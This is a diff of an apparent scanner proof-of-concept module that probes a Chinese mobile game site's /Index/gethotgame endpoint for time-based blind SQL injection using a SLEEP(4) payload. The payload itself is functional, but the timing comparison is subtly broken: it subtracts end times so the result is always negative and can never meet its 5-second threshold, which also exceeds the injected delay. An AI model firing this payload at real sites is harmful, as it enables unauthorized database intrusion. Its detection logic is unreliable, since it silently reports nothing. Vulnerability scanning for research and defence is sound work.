@@ -9,7 +9,7 @@ class Vuln(ABVuln):
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
     disclosure_date = '2016-06-26'  # 漏洞公布时间
-    desc = '''模版漏洞描述
+    desc = '''
     暴风游戏中兴手机版SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
     ''' # 漏洞描述
     ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=207591
@@ -32,11 +32,11 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             payload = "/Index/gethotgame?platform=1) AND (SELECT(SLEEP(4))KfMJ) AND (1985=1985"
             payload1 = "/Index/gethotgame?platform=1"
-            url = self.target + 'aaaaaaaaaaa'
+            url = self.target
             start_time1 =time.time()
-            _response = requests.post(url, data=payload)
+            _response = requests.get(url + payload)
             end_time1 =time.time()
-            _response = requests.post(url, data=payload1)
+            _response = requests.get(url + payload1)
             end_time2 =time.time() 
             if (end_time1-start_time1) - (end_time2-start_time1) >= 5:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
